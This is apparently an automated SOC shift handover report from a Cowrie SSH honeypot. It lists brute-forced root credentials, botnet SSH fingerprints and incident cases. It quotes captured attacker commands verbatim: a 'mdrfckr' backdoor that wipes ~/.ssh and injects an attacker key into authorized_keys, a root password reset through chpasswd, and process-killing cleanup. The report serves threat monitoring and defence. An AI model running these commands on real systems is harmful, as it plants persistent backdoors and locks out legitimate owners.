# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-05-01 |
| **Generated At** | 2026-05-01T22:54:38Z |
| **Shift Time** | 22:54 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **1034** |
| Confirmed Threats | **203** |
| False Positives Filtered | **831** (80.4%) |
| Unique Attacker IPs | **63** |
| Countries of Origin | **20** |
| High Severity Cases | **77** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **957** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **198** |
| Unique Credential Pairs | **91** |
| Unique Usernames | **33** |
| Unique Passwords | **89** |
| Successful Auth Pairs | **49** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 77 |
| `345gs5662d34` | 38 |
| `ubuntu` | 15 |
| `admin` | 11 |
| `postgres` | 6 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 38 |
| `3245gs5662d34` | 37 |
| `dev` | 4 |
| `Pa$$w0rd` | 2 |
| `sysadmin@2022` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 38 |
| `root` | `3245gs5662d34` | 37 |
| `admin` | `Pa$$w0rd` | 2 |
| `sysadmin` | `sysadmin@2022` | 2 |
| `root` | `admin88` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `admin88` | `129.222.203.169` | 2026-05-01T21:22:44 |
| `root` | `3245gs5662d34` | `129.222.203.169` | 2026-05-01T21:22:51 |
| `root` | `admin333` | `129.222.203.169` | 2026-05-01T21:26:15 |
| `root` | `123test321` | `129.222.203.169` | 2026-05-01T21:30:40 |
| `root` | `test12` | `129.222.203.169` | 2026-05-01T21:31:32 |
| `root` | `debian2023` | `129.222.203.169` | 2026-05-01T21:44:03 |
| `root` | `test123!!` | `129.222.203.169` | 2026-05-01T21:44:55 |
| `root` | `123test321` | `76.79.213.70` | 2026-05-01T21:45:05 |
| `root` | `3245gs5662d34` | `76.79.213.70` | 2026-05-01T21:45:12 |
| `root` | `admin333` | `76.79.213.70` | 2026-05-01T21:47:42 |
| `root` | `test123!!` | `76.79.213.70` | 2026-05-01T21:50:25 |
| `root` | `test12` | `76.79.213.70` | 2026-05-01T21:51:18 |
| `root` | `admin88` | `76.79.213.70` | 2026-05-01T21:54:00 |
| `root` | `secreto` | `38.255.75.12` | 2026-05-01T22:04:51 |
| `root` | `debian2023` | `76.79.213.70` | 2026-05-01T22:04:54 |
| `root` | `3245gs5662d34` | `38.255.75.12` | 2026-05-01T22:04:58 |
| `root` | `Support.2026` | `38.255.75.243` | 2026-05-01T22:06:07 |
| `root` | `admin!234` | `38.255.75.78` | 2026-05-01T22:07:19 |
| `root` | `Support_2025` | `38.255.75.125` | 2026-05-01T22:08:29 |
| `root` | `Asd1234` | `38.255.75.7` | 2026-05-01T22:09:39 |
| `root` | `3245gs5662d34` | `38.255.75.104` | 2026-05-01T22:09:46 |
| `root` | `pokemon` | `38.255.75.12` | 2026-05-01T22:11:55 |
| `root` | `ciaociao` | `38.255.75.46` | 2026-05-01T22:13:02 |
| `root` | `Vilas123` | `38.255.75.165` | 2026-05-01T22:15:21 |
| `root` | `Pass@w0rd123` | `38.255.75.12` | 2026-05-01T22:16:29 |
| `root` | `Qweasd2026` | `38.255.75.140` | 2026-05-01T22:17:37 |
| `root` | `mysql@123` | `38.255.75.12` | 2026-05-01T22:19:51 |
| `root` | `3245gs5662d34` | `38.255.75.202` | 2026-05-01T22:19:57 |
| `root` | `Test123` | `38.255.75.12` | 2026-05-01T22:22:12 |
| `root` | `Huawei@123456789` | `38.255.75.12` | 2026-05-01T22:23:23 |
| `root` | `3245gs5662d34` | `38.255.75.45` | 2026-05-01T22:23:30 |
| `root` | `qwer12` | `38.255.75.105` | 2026-05-01T22:24:33 |
| `root` | `------fuck------` | `106.13.144.200` | 2026-05-01T22:24:33 |
| `root` | `Rootroot1234` | `38.255.75.12` | 2026-05-01T22:25:43 |
| `root` | `3245gs5662d34` | `38.255.75.58` | 2026-05-01T22:25:50 |
| `root` | `ws@123456` | `38.255.75.12` | 2026-05-01T22:29:13 |
| `root` | `admin123456!@` | `38.255.75.12` | 2026-05-01T22:30:21 |
| `root` | `1231qaz2wsx` | `38.255.75.12` | 2026-05-01T22:32:40 |
| `root` | `a123456!@#` | `38.255.75.31` | 2026-05-01T22:33:52 |
| `root` | `test@2025` | `38.255.75.123` | 2026-05-01T22:35:02 |
| `root` | `test@12345` | `38.255.75.104` | 2026-05-01T22:36:13 |
| `root` | `3245gs5662d34` | `38.255.75.36` | 2026-05-01T22:36:20 |
| `root` | `vincent` | `38.255.75.32` | 2026-05-01T22:37:21 |
| `root` | `admin@@` | `14.103.108.225` | 2026-05-01T22:43:37 |
| `root` | `@admin@123` | `109.91.4.177` | 2026-05-01T22:48:31 |
| `root` | `3245gs5662d34` | `109.91.4.177` | 2026-05-01T22:48:36 |
| `root` | `admin123456` | `109.91.4.177` | 2026-05-01T22:52:03 |
| `root` | `` | `192.42.116.53` | 2026-05-01T22:52:48 |
| `root` | `admin2000` | `109.91.4.177` | 2026-05-01T22:52:58 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **1034** |
| Sessions with Fingerprint | **5** |
| Unique HASSH Fingerprints | **5** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 206 |
| Go SSH scanner | 2 |
| OpenSSH | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `af8223ac9914...` | libssh-based | 153 | 28 |
| `03a80b21afa8...` | Modern SSH client | 53 | 8 |
| `98f63c4d9c87...` | Generic scanner | 1 | 1 |
| `8c917104c76e...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `af8223ac9914...` | libssh | 153 | 28 | libssh-based |
| `03a80b21afa8...` | libssh | 53 | 8 | Modern SSH client |
| `95420f9d932d...` | OpenSSH | 1 | 1 | — |
| `98f63c4d9c87...` | Go SSH scanner | 1 | 1 | Generic scanner |
| `8c917104c76e...` | Go SSH scanner | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **4** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 37 | 16 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:aekqdFJEOp6r"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `14.103.108.225`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `38.255.75.140`, `38.255.75.104`, `38.255.75.125`, `38.255.75.123`, `38.255.75.46`, `38.255.75.32`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **63** |
| Unique ASNs | **34** |
| High-Risk ASNs | **19** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS272857` | MAXI CABLE C.A | 23 | LOW |
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 4 | HIGH |
| `AS211680` | NSEC - Sistemas Informaticos, S.A. | 2 | HIGH |
| `AS4788` | TM TECHNOLOGY SERVICES SDN. BHD. | 2 | LOW |
| `AS14061` | DigitalOcean, LLC | 2 | LOW |
| `AS4134` | CHINANET BACKBONE | 2 | HIGH |
| `AS8075` | Microsoft Corporation | 1 | LOW |
| `AS132241` | SKSA TECHNOLOGY SDN BHD | 1 | MEDIUM |

---

---

## 🚨 Priority Cases — Immediate Attention (74)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-d72e9558f1b8

| Field | Detail |
|---|---|
| **Source IP** | `129.222.203[.]169` |
| **First Seen** | 2026-05-01 21:22 |
| **Last Seen** | 2026-05-01 21:22 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 21:22:42` | `cowrie.session.connect` |
| `2026-05-01 21:22:42` | `cowrie.client.version` |
| `2026-05-01 21:22:43` | `cowrie.client.kex` |
| `2026-05-01 21:22:44` | `cowrie.login.success` |
| `2026-05-01 21:22:45` | `cowrie.session.params` |
| `2026-05-01 21:22:45` | `cowrie.command.input` |
| `2026-05-01 21:22:45` | `cowrie.command.failed` |
| `2026-05-01 21:22:45` | `cowrie.log.closed` |
| `2026-05-01 21:22:46` | `cowrie.session.params` |
| `2026-05-01 21:22:46` | `cowrie.command.input` |
| `2026-05-01 21:22:46` | `cowrie.session.file_download` |
| `2026-05-01 21:22:46` | `cowrie.log.closed` |
| `2026-05-01 21:22:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.222.203[.]169` to AbuseIPDB if not already reported
- [ ] Block `129.222.203[.]169` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-37dec0ce73c6

| Field | Detail |
|---|---|
| **Source IP** | `129.222.203[.]169` |
| **First Seen** | 2026-05-01 21:22 |
| **Last Seen** | 2026-05-01 21:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 21:22:50` | `cowrie.session.connect` |
| `2026-05-01 21:22:50` | `cowrie.client.version` |
| `2026-05-01 21:22:50` | `cowrie.client.kex` |
| `2026-05-01 21:22:51` | `cowrie.login.success` |
| `2026-05-01 21:22:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.222.203[.]169` to AbuseIPDB if not already reported
- [ ] Block `129.222.203[.]169` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fc384c6389b1

| Field | Detail |
|---|---|
| **Source IP** | `129.222.203[.]169` |
| **First Seen** | 2026-05-01 21:26 |
| **Last Seen** | 2026-05-01 21:26 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 21:26:13` | `cowrie.session.connect` |
| `2026-05-01 21:26:13` | `cowrie.client.version` |
| `2026-05-01 21:26:14` | `cowrie.client.kex` |
| `2026-05-01 21:26:15` | `cowrie.login.success` |
| `2026-05-01 21:26:16` | `cowrie.session.params` |
| `2026-05-01 21:26:16` | `cowrie.command.input` |
| `2026-05-01 21:26:16` | `cowrie.command.failed` |
| `2026-05-01 21:26:16` | `cowrie.log.closed` |
| `2026-05-01 21:26:17` | `cowrie.session.params` |
| `2026-05-01 21:26:17` | `cowrie.command.input` |
| `2026-05-01 21:26:17` | `cowrie.session.file_download` |
| `2026-05-01 21:26:17` | `cowrie.log.closed` |
| `2026-05-01 21:26:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.222.203[.]169` to AbuseIPDB if not already reported
- [ ] Block `129.222.203[.]169` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-96170fbffd16

| Field | Detail |
|---|---|
| **Source IP** | `129.222.203[.]169` |
| **First Seen** | 2026-05-01 21:26 |
| **Last Seen** | 2026-05-01 21:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 21:26:22` | `cowrie.session.connect` |
| `2026-05-01 21:26:22` | `cowrie.client.version` |
| `2026-05-01 21:26:22` | `cowrie.client.kex` |
| `2026-05-01 21:26:23` | `cowrie.login.success` |
| `2026-05-01 21:26:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.222.203[.]169` to AbuseIPDB if not already reported
- [ ] Block `129.222.203[.]169` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b1a22847eb37

| Field | Detail |
|---|---|
| **Source IP** | `129.222.203[.]169` |
| **First Seen** | 2026-05-01 21:30 |
| **Last Seen** | 2026-05-01 21:30 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 21:30:38` | `cowrie.session.connect` |
| `2026-05-01 21:30:38` | `cowrie.client.version` |
| `2026-05-01 21:30:39` | `cowrie.client.kex` |
| `2026-05-01 21:30:40` | `cowrie.login.success` |
| `2026-05-01 21:30:41` | `cowrie.session.params` |
| `2026-05-01 21:30:41` | `cowrie.command.input` |
| `2026-05-01 21:30:41` | `cowrie.command.failed` |
| `2026-05-01 21:30:41` | `cowrie.log.closed` |
| `2026-05-01 21:30:42` | `cowrie.session.params` |
| `2026-05-01 21:30:42` | `cowrie.command.input` |
| `2026-05-01 21:30:42` | `cowrie.session.file_download` |
| `2026-05-01 21:30:42` | `cowrie.log.closed` |
| `2026-05-01 21:30:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.222.203[.]169` to AbuseIPDB if not already reported
- [ ] Block `129.222.203[.]169` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c6333621c654

| Field | Detail |
|---|---|
| **Source IP** | `129.222.203[.]169` |
| **First Seen** | 2026-05-01 21:30 |
| **Last Seen** | 2026-05-01 21:30 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 21:30:46` | `cowrie.session.connect` |
| `2026-05-01 21:30:46` | `cowrie.client.version` |
| `2026-05-01 21:30:46` | `cowrie.client.kex` |
| `2026-05-01 21:30:47` | `cowrie.login.success` |
| `2026-05-01 21:30:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.222.203[.]169` to AbuseIPDB if not already reported
- [ ] Block `129.222.203[.]169` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4673d6fe1635

| Field | Detail |
|---|---|
| **Source IP** | `129.222.203[.]169` |
| **First Seen** | 2026-05-01 21:31 |
| **Last Seen** | 2026-05-01 21:31 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 21:31:30` | `cowrie.session.connect` |
| `2026-05-01 21:31:30` | `cowrie.client.version` |
| `2026-05-01 21:31:30` | `cowrie.client.kex` |
| `2026-05-01 21:31:32` | `cowrie.login.success` |
| `2026-05-01 21:31:32` | `cowrie.session.params` |
| `2026-05-01 21:31:32` | `cowrie.command.input` |
| `2026-05-01 21:31:32` | `cowrie.command.failed` |
| `2026-05-01 21:31:33` | `cowrie.log.closed` |
| `2026-05-01 21:31:33` | `cowrie.session.params` |
| `2026-05-01 21:31:33` | `cowrie.command.input` |
| `2026-05-01 21:31:34` | `cowrie.session.file_download` |
| `2026-05-01 21:31:34` | `cowrie.log.closed` |
| `2026-05-01 21:31:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.222.203[.]169` to AbuseIPDB if not already reported
- [ ] Block `129.222.203[.]169` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6a94deb748df

| Field | Detail |
|---|---|
| **Source IP** | `129.222.203[.]169` |
| **First Seen** | 2026-05-01 21:31 |
| **Last Seen** | 2026-05-01 21:31 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 21:31:37` | `cowrie.session.connect` |
| `2026-05-01 21:31:37` | `cowrie.client.version` |
| `2026-05-01 21:31:38` | `cowrie.client.kex` |
| `2026-05-01 21:31:39` | `cowrie.login.success` |
| `2026-05-01 21:31:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.222.203[.]169` to AbuseIPDB if not already reported
- [ ] Block `129.222.203[.]169` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-89b028681935

| Field | Detail |
|---|---|
| **Source IP** | `129.222.203[.]169` |
| **First Seen** | 2026-05-01 21:44 |
| **Last Seen** | 2026-05-01 21:44 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 21:44:01` | `cowrie.session.connect` |
| `2026-05-01 21:44:01` | `cowrie.client.version` |
| `2026-05-01 21:44:02` | `cowrie.client.kex` |
| `2026-05-01 21:44:03` | `cowrie.login.success` |
| `2026-05-01 21:44:04` | `cowrie.session.params` |
| `2026-05-01 21:44:04` | `cowrie.command.input` |
| `2026-05-01 21:44:04` | `cowrie.command.failed` |
| `2026-05-01 21:44:04` | `cowrie.log.closed` |
| `2026-05-01 21:44:05` | `cowrie.session.params` |
| `2026-05-01 21:44:05` | `cowrie.command.input` |
| `2026-05-01 21:44:05` | `cowrie.session.file_download` |
| `2026-05-01 21:44:05` | `cowrie.log.closed` |
| `2026-05-01 21:44:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.222.203[.]169` to AbuseIPDB if not already reported
- [ ] Block `129.222.203[.]169` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-58eb4cdacacc

| Field | Detail |
|---|---|
| **Source IP** | `129.222.203[.]169` |
| **First Seen** | 2026-05-01 21:44 |
| **Last Seen** | 2026-05-01 21:44 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 21:44:09` | `cowrie.session.connect` |
| `2026-05-01 21:44:09` | `cowrie.client.version` |
| `2026-05-01 21:44:09` | `cowrie.client.kex` |
| `2026-05-01 21:44:11` | `cowrie.login.success` |
| `2026-05-01 21:44:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.222.203[.]169` to AbuseIPDB if not already reported
- [ ] Block `129.222.203[.]169` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-77f4a523b287

| Field | Detail |
|---|---|
| **Source IP** | `129.222.203[.]169` |
| **First Seen** | 2026-05-01 21:44 |
| **Last Seen** | 2026-05-01 21:45 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

